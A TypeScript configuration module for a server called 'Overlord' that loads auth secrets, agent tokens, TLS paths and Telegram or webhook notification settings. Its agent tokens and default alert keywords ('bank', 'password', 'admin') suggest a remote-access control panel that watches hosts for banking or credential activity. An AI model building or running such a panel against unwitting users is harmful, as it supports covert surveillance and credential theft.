import { existsSync, readFileSync, writeFileSync } from "fs";
import { writeFile, mkdir } from "fs/promises";
import { resolve } from "path";
import logger from "./logger";
import { ensureDataDir } from "./paths";

export interface Config {
  auth: {
    username: string;
    password: string;
    jwtSecret: string;
    agentToken: string;
  };
  server: {
    port: number;
    host: string;
  };
  tls: {
    certPath: string;
    keyPath: string;
    caPath: string;
  };
  notifications: {
    keywords: string[];
    minIntervalMs: number;
    spamWindowMs: number;
    spamWarnThreshold: number;
    historyLimit: number;
    webhookEnabled: boolean;
    webhookUrl: string;
    telegramEnabled: boolean;
    telegramBotToken: string;
    telegramChatId: string;
  };
}

const DEFAULT_CONFIG: Config = {
  auth: {
    username: "admin",
    password: "",
    jwtSecret: "",
    agentToken: "",
  },
  server: {
    port: 5173,
    host: "0.0.0.0",
  },
  tls: {
    certPath: "./certs/server.crt",
    keyPath: "./certs/server.key",
    caPath: "",
  },
  notifications: {
    keywords: ["bank", "password", "admin"],
    minIntervalMs: 8000,
    spamWindowMs: 60000,
    spamWarnThreshold: 5,
    historyLimit: 200,
    webhookEnabled: false,
    webhookUrl: "",
    telegramEnabled: false,
    telegramBotToken: "",
    telegramChatId: "",
  },
};

type SaveSecrets = {
  auth?: {
    jwtSecret?: string;
    agentToken?: string;
    bootstrapPassword?: string;
  };
};

function generateRandomSecret(length = 48): string {
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
  let secret = "";
  const array = new Uint8Array(length);
  crypto.getRandomValues(array);
  for (let i = 0; i < length; i++) {
    secret += chars[array[i] % chars.length];
  }
  return secret;
}

function loadSaveSecrets(savePath: string): SaveSecrets {
  if (!existsSync(savePath)) {
    return {};
  }

  try {
    const raw = readFileSync(savePath, "utf-8");
    const parsed = JSON.parse(raw);
    return typeof parsed === "object" && parsed ? parsed : {};
  } catch (error) {
    logger.warn("Failed to parse save.json, regenerating missing secrets:", error);
    return {};
  }
}

function persistSaveSecrets(savePath: string, secrets: SaveSecrets): void {
  try {
    writeFileSync(savePath, JSON.stringify(secrets, null, 2));
    logger.info(`Persisted secrets to ${savePath}`);
  } catch (error) {
    logger.warn("Failed to persist save.json secrets", error);
  }
}

let configCache: Config | null = null;

export function loadConfig(): Config {
  if (configCache) {
    return configCache;
  }

  let fileConfig: Partial<Config> = {};
  const dataDir = ensureDataDir();
  const savePath = resolve(dataDir, "save.json");
  const savedSecrets = loadSaveSecrets(savePath);
  let saveChanged = false;

  const configPath = resolve(process.cwd(), "config.json");
  if (existsSync(configPath)) {
    try {
      const content = readFileSync(configPath, "utf-8");
      fileConfig = JSON.parse(content);
      logger.info("Loaded configuration from config.json");
    } catch (error) {
      logger.warn("Failed to parse config.json, using defaults:", error);
    }
  } else {
    logger.info(
      "No config.json found, using defaults and environment variables",
    );
  }

  const jwtSecretFromEnv = process.env.JWT_SECRET;
  const jwtSecret =
    process.env.JWT_SECRET ||
    fileConfig.auth?.jwtSecret ||
    savedSecrets.auth?.jwtSecret ||
    DEFAULT_CONFIG.auth.jwtSecret;

  let finalJwtSecret = jwtSecret;
  if (!finalJwtSecret) {
    finalJwtSecret = generateRandomSecret(64);
    saveChanged = true;
    logger.info("No JWT secret provided, generated secure random secret");
  }

  const agentTokenFromEnv = process.env.OVERLORD_AGENT_TOKEN;
  const agentTokenFromConfig = fileConfig.auth?.agentToken;
  let finalAgentToken =
    agentTokenFromEnv ||
    agentTokenFromConfig ||
    savedSecrets.auth?.agentToken ||
    DEFAULT_CONFIG.auth.agentToken;
  if (!finalAgentToken) {
    finalAgentToken = generateRandomSecret(64);
    saveChanged = true;
    logger.info("No agent token provided, generated secure random token");
  }

  const passwordFromEnv = process.env.OVERLORD_PASS;
  const passwordFromConfig = fileConfig.auth?.password;
  let finalBootstrapPassword =
    passwordFromEnv ||
    passwordFromConfig ||
    savedSecrets.auth?.bootstrapPassword ||
    DEFAULT_CONFIG.auth.password;
  if (!finalBootstrapPassword) {
    finalBootstrapPassword = generateRandomSecret(28);
    saveChanged = true;
    logger.info(
      "No initial admin password provided, generated bootstrap password in save.json",
    );
  }

  const keywordsEnv = process.env.OVERLORD_NOTIFICATION_KEYWORDS;
  const keywordsFromEnv = keywordsEnv
    ? keywordsEnv
        .split(",")
        .map((k) => k.trim())
        .filter(Boolean)
    : [];

  configCache = {
    auth: {
      username:
        process.env.OVERLORD_USER ||
        fileConfig.auth?.username ||
        DEFAULT_CONFIG.auth.username,
      password: finalBootstrapPassword,
      jwtSecret: finalJwtSecret,
      agentToken: finalAgentToken,
    },
    server: {
      port:
        Number(process.env.PORT) ||
        fileConfig.server?.port ||
        DEFAULT_CONFIG.server.port,
      host:
        process.env.HOST ||
        fileConfig.server?.host ||
        DEFAULT_CONFIG.server.host,
    },
    tls: {
      certPath:
        process.env.OVERLORD_TLS_CERT ||
        fileConfig.tls?.certPath ||
        DEFAULT_CONFIG.tls.certPath,
      keyPath:
        process.env.OVERLORD_TLS_KEY ||
        fileConfig.tls?.keyPath ||
        DEFAULT_CONFIG.tls.keyPath,
      caPath:
        process.env.OVERLORD_TLS_CA ||
        fileConfig.tls?.caPath ||
        DEFAULT_CONFIG.tls.caPath,
    },
    notifications: {
      keywords:
        keywordsFromEnv.length > 0
          ? keywordsFromEnv
          : (fileConfig.notifications?.keywords ||
              DEFAULT_CONFIG.notifications.keywords),
      minIntervalMs:
        Number(process.env.OVERLORD_NOTIFICATION_MIN_INTERVAL_MS) ||
        fileConfig.notifications?.minIntervalMs ||
        DEFAULT_CONFIG.notifications.minIntervalMs,
      spamWindowMs:
        Number(process.env.OVERLORD_NOTIFICATION_SPAM_WINDOW_MS) ||
        fileConfig.notifications?.spamWindowMs ||
        DEFAULT_CONFIG.notifications.spamWindowMs,
      spamWarnThreshold:
        Number(process.env.OVERLORD_NOTIFICATION_SPAM_WARN_THRESHOLD) ||
        fileConfig.notifications?.spamWarnThreshold ||
        DEFAULT_CONFIG.notifications.spamWarnThreshold,
      historyLimit:
        Number(process.env.OVERLORD_NOTIFICATION_HISTORY_LIMIT) ||
        fileConfig.notifications?.historyLimit ||
        DEFAULT_CONFIG.notifications.historyLimit,
      webhookEnabled:
        String(process.env.OVERLORD_NOTIFICATION_WEBHOOK_ENABLED || "").toLowerCase() === "true" ||
        fileConfig.notifications?.webhookEnabled ||
        DEFAULT_CONFIG.notifications.webhookEnabled,
      webhookUrl:
        process.env.OVERLORD_NOTIFICATION_WEBHOOK_URL ||
        fileConfig.notifications?.webhookUrl ||
        DEFAULT_CONFIG.notifications.webhookUrl,
      telegramEnabled:
        String(process.env.OVERLORD_NOTIFICATION_TELEGRAM_ENABLED || "").toLowerCase() === "true" ||
        fileConfig.notifications?.telegramEnabled ||
        DEFAULT_CONFIG.notifications.telegramEnabled,
      telegramBotToken:
        process.env.OVERLORD_NOTIFICATION_TELEGRAM_BOT_TOKEN ||
        fileConfig.notifications?.telegramBotToken ||
        DEFAULT_CONFIG.notifications.telegramBotToken,
      telegramChatId:
        process.env.OVERLORD_NOTIFICATION_TELEGRAM_CHAT_ID ||
        fileConfig.notifications?.telegramChatId ||
        DEFAULT_CONFIG.notifications.telegramChatId,
    },
  };

  if (saveChanged) {
    const nextSecrets: SaveSecrets = {
      auth: {
        jwtSecret: finalJwtSecret,
        agentToken: finalAgentToken,
        bootstrapPassword: finalBootstrapPassword,
      },
    };
    persistSaveSecrets(savePath, nextSecrets);
    logger.info(
      `Generated runtime secrets are stored at ${savePath}. Keep this file private.`,
    );
  }

  if (jwtSecretFromEnv) {
    logger.info("JWT secret loaded from JWT_SECRET environment variable");
  }
  if (agentTokenFromEnv) {
    logger.info("Agent token loaded from OVERLORD_AGENT_TOKEN environment variable");
  }
  if (passwordFromEnv) {
    logger.info("Initial admin password loaded from OVERLORD_PASS environment variable");
  }

  return configCache;
}

export function getConfig(): Config {
  if (!configCache) {
    return loadConfig();
  }
  return configCache;
}

export async function updateNotificationsConfig(
  updates: Partial<Config["notifications"]>,
): Promise<Config["notifications"]> {
  const current = getConfig();
  const keywords = (updates.keywords || current.notifications.keywords || [])
    .map((k) => String(k).trim())
    .filter(Boolean);
  const deduped = Array.from(new Set(keywords));

  const next = {
    ...current.notifications,
    ...updates,
    keywords: deduped,
  };

  configCache = {
    ...current,
    notifications: next,
  };

  const configPath = resolve(process.cwd(), "config.json");
  let fileConfig: any = {};
  if (existsSync(configPath)) {
    try {
      const content = readFileSync(configPath, "utf-8");
      fileConfig = JSON.parse(content) || {};
    } catch {
      fileConfig = {};
    }
  }

  fileConfig.notifications = next;

  try {
    await mkdir(resolve(process.cwd()), { recursive: true });
  } catch {}

  await writeFile(configPath, JSON.stringify(fileConfig, null, 2));
  return next;
}
